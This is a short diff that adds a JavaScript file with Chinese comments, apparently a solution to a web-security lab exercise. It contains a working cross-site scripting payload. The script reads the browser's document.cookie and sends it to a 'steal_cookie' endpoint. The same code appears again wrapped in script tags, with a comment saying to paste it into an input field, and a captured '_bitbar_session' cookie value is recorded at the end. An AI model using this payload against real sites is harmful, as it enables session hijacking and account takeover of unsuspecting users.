@@ -1,0 +1,30 @@
+//获取当前网站存储在用户浏览器中的所有 cookies
+let cookies=document.cookie;
+//新建xhr实例
+let xhr=new XMLHttpRequest();
+//发起一个 GET 请求，包含查询参数，将cookies发送到服务器
+xhr.open("GET",`steal_cookie?cookie=${cookies}`);
+//定义事件处理函数，在 HTTP 请求成功完成时调用
+xhr.onload=()=>{
+    alert("successed!");
+};
+//发送配置好的 HTTP 请求
+xhr.send();
+
+/*
+放入输入框
+<script>
+let cookies=document.cookie;
+let xhr=new XMLHttpRequest();
+xhr.open("GET",`steal_cookie?cookie=${cookies}`);
+xhr.onload=()=>{
+    alert("successed!");
+};
+xhr.send();
+</script>
+*/
+
+/*
+偷取的cookie
+_bitbar_session=BAh7CUkiD3Nlc3Npb25faWQGOgZFVEkiJTFjNDNhZTZlNmM0
+*/
